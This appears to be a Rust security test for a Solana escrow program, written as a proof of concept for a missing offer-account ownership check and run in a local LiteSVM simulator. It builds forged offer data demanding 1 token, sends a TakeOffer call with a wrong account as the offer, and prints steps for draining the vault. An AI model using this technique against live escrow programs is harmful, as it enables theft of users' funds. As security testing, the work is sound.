// Exploit: Fake Offer State (Missing Offer Ownership Check)
//
// Vulnerability: The program does not verify the offer account is owned by the program.
// Attack: Attacker creates a fake offer account with manipulated data (e.g., tiny token_b_wanted).
// Result: Taker pays almost nothing but receives full Token A from vault.
//
// Note: This is harder to exploit because we need a real vault with tokens.
// The attack setup requires a legitimate offer to be created first, then
// we try to use a fake offer account with the same vault.

mod utils;

use utils::*;
use litesvm_token::{
    spl_token::state::Account as TokenAccount,
    get_spl_account,
};
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use spl_associated_token_account::get_associated_token_address;
use solana_system_interface::program::ID as SYSTEM_PROGRAM_ID;


#[test]
fn test_exploit_fake_offer_state() {
    println!("\n=== EXPLOIT TEST: Fake Offer State (Missing Ownership Check) ===\n");
    println!("[Scenario] Attacker creates fake offer with manipulated amounts");

    let mut scenario = setup_escrow_scenario();

    // Create a legitimate offer first (to fund the vault)
    println!("[Setup] Creating legitimate offer to fund vault...");
    create_offer(
        &mut scenario.svm,
        &scenario.proposer,
        &scenario.mint_a,
        &scenario.mint_b,
        &scenario.proposer_ata_a,
        &scenario.offer_pda,
        &scenario.vault_ata,
        scenario.offer_id,
        scenario.bump,
    );

    let vault_balance: TokenAccount = get_spl_account(&scenario.svm, &scenario.vault_ata)
        .expect("Vault should exist");
    println!("[Setup] Vault Token A balance: {}", vault_balance.amount);

    // Now create a FAKE offer account with manipulated data
    // The fake offer will have token_b_wanted_amount = 1 (instead of 50 billion)
    println!("[Attack] Creating fake offer account with tiny token_b_wanted...");

    // Create a fake offer account owned by system program (not our escrow program)
    let _fake_offer = Keypair::new();

    // Build fake offer state data
    // MakeState layout: id(8) + proposer(32) + mint_a(32) + mint_b(32) + token_b_wanted(8) + token_a_offered(8) + bump(1) + is_initialized(1) = 122 bytes
    let mut fake_offer_data = Vec::with_capacity(122);
    fake_offer_data.extend_from_slice(&scenario.offer_id);                        // id: 8 bytes
    fake_offer_data.extend_from_slice(&scenario.proposer.pubkey().to_bytes());    // proposer: 32 bytes
    fake_offer_data.extend_from_slice(&scenario.mint_a.to_bytes());               // mint_a: 32 bytes
    fake_offer_data.extend_from_slice(&scenario.mint_b.to_bytes());               // mint_b: 32 bytes
    fake_offer_data.extend_from_slice(&1u64.to_le_bytes());              // EXPLOIT: token_b_wanted = 1 (tiny!)
    fake_offer_data.extend_from_slice(&TOKEN_A_OFFER_AMOUNT.to_le_bytes()); // token_a_offered: normal
    fake_offer_data.push(scenario.bump);                                          // bump: 1 byte
    fake_offer_data.push(1u8);                                           // is_initialized: 1 byte

    // We can't easily inject a fake account in LiteSVM without the set_account method
    // So we'll demonstrate by trying to use the real offer but show what WOULD happen
    // if ownership wasn't checked

    println!("[Analysis] To fully exploit this, attacker would:");
    println!("           1. Create an account owned by a malicious program");
    println!("           2. Fill it with fake MakeState data (token_b_wanted = 1)");
    println!("           3. Call TakeOffer with the fake offer account");
    println!("           4. Pay 1 token instead of 50 billion, receive 100 billion Token A");
    println!("");
    println!("[Analysis] The vulnerable program would accept because it doesn't check:");
    println!("           - offer.owner == escrow_program_id");
    println!("");

    // Demonstrate by checking if the program validates ownership
    // We'll call with a different account that's NOT owned by the program

    // Use a random keypair as fake offer (owned by system program, wrong data)
    // This will likely fail, but for the wrong reason if ownership isn't checked

    let proposer_ata_b = get_associated_token_address(&scenario.proposer.pubkey(), &scenario.mint_b);

    // Try to use system account as offer (definitely wrong owner)
    let take_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.taker.pubkey(), true),
            AccountMeta::new(scenario.proposer.pubkey(), false),
            AccountMeta::new(proposer_ata_b, false),
            AccountMeta::new_readonly(scenario.mint_b, false),
            AccountMeta::new_readonly(scenario.mint_a, false),
            AccountMeta::new(scenario.taker_ata_a, false),
            AccountMeta::new(scenario.taker_ata_b, false),
            AccountMeta::new(scenario.payer.pubkey(), false),  // EXPLOIT: using payer account as fake offer
            AccountMeta::new(scenario.vault_ata, false),
            AccountMeta::new_readonly(TOKEN_PROGRAM_ID, false),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
            AccountMeta::new_readonly(ASSOCIATED_TOKEN_PROGRAM_ID, false),
        ],
        data: build_take_offer_data(),
    };

    let take_tx = Transaction::new_signed_with_payer(
        &[take_ix],
        Some(&scenario.taker.pubkey()),
        &[&scenario.taker],
        scenario.svm.latest_blockhash(),
    );

    println!("[Attack] Calling TakeOffer with wrong account as offer...");
    let result = scenario.svm.send_transaction(take_tx);

    match &result {
        Ok(_) => {
            println!("[VULNERABLE] Program accepted a fake offer account!");
            println!("[EXPLOIT SUCCESS] No ownership check exists!");
        }
        Err(e) => {
            let meta = &e.meta;
          
            let logs_str = meta.logs.join(" ");

                // Check if it failed for the RIGHT reason (ownership) or WRONG reason (data parsing)
                if logs_str.contains("InvalidAccountOwner") {
                    println!("[SECURE] Program correctly rejected - wrong owner");
                } else if logs_str.contains("InvalidAccountData") {
                    println!("[VULNERABLE] Program did NOT check owner - failed on data parsing");
                    println!("[Analysis] A secure program would reject 'InvalidAccountOwner' first");
                } else {
                    println!("[Result] Failed with: {:?}", e.err);
                }

                println!("[Logs]:");
                for log in &meta.logs {
                    println!("       {}", log);
                }
         
        }
    }

    println!("\n=== END: Fake Offer State Exploit ===\n");
}
